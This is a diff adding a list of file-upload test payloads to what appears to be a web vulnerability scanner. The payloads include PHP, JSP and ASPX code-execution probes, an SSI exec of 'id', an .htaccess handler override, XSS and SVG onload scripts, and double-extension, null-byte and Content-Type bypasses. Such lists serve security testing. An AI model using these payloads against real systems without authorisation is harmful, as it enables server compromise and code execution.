@@ -56,6 +56,24 @@ UPLOAD_TEST_FILES = [
     },
 ]
 
+UPLOAD_FILES = [
+    {"filename": "test.php", "content": "<?php echo 'allma_v10_upload_test'; ?>", "content_type": "application/x-php"},
+    {"filename": "test.html", "content": "<script>alert('allma_v10_xss')</script>", "content_type": "text/html"},
+    {"filename": "test.svg", "content": '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', "content_type": "image/svg+xml"},
+    {"filename": "test.shtml", "content": '<!--#exec cmd="id"-->', "content_type": "text/html"},
+    {"filename": ".htaccess", "content": "AddType application/x-httpd-php .jpg", "content_type": "text/plain"},
+    {"filename": "test.jsp", "content": "<%= Runtime.getRuntime().exec('id') %>", "content_type": "text/html"},
+    # V10.4: Double extension bypass
+    {"filename": "test.php.jpg", "content": "<?php echo 'allma_v10_double_ext'; ?>", "content_type": "image/jpeg"},
+    {"filename": "test.php5.png", "content": "<?php echo 'allma_v10_php5'; ?>", "content_type": "image/png"},
+    {"filename": "test.phtml.gif", "content": "<?php echo 'allma_v10_phtml'; ?>", "content_type": "image/gif"},
+    # V10.4: Null byte bypass  
+    {"filename": "test.php%00.jpg", "content": "<?php echo 'allma_v10_null'; ?>", "content_type": "image/jpeg"},
+    {"filename": "test.php\x00.png", "content": "<?php echo 'allma_v10_null2'; ?>", "content_type": "image/png"},
+    # V10.4: Content-Type mismatch (enviar PHP com Content-Type de imagem)
+    {"filename": "test.php", "content": "<?php echo 'allma_v10_ct_mismatch'; ?>", "content_type": "image/jpeg"},
+    {"filename": "test.aspx", "content": "<%= System.IO.File.ReadAllText(@'c:\\windows\\win.ini') %>", "content_type": "image/png"},
+]
 
 def _test_upload_endpoint(url: str) -> dict | None:
     """Testa se um endpoint aceita uploads e quais métodos/tipos."""
